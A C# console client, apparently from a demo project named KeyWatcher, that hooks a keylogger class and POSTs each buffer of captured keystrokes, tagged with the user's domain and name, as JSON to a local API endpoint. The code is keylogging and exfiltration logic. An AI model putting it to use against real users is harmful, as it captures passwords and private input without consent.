using KeyWatcher.Messages;
using Newtonsoft.Json;
using System;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace KeyWatcher.Signaled.Client
{
	class Program
	{
		private const int BufferSize = 20;
		private static readonly Uri ApiUrl = new Uri("http://localhost:63899/api/keywatcher");

		static async Task Main(string[] args)
		{
			await Console.Out.WriteLineAsync("Begin...");
			var userName = Program.GetUserName();
			var client = new HttpClient();

			var keyLogger = new BufferedEventedKeyWatcher(Program.BufferSize);
			keyLogger.KeysLogged += async (s, e) =>
			{
				var message = JsonConvert.SerializeObject(
					new UserKeysMessage(userName, e.Keys.ToArray()), Formatting.Indented);
				var content = new StringContent(message,
					Encoding.Unicode, "application/json");
				await client.PostAsync(Program.ApiUrl, content);
			};


			keyLogger.Listen();
		}

		private static string GetUserName() =>
			$"{(!string.IsNullOrWhiteSpace(Environment.UserDomainName) ? $"{Environment.UserDomainName}-" : string.Empty)}{Environment.UserName}";
	}
}
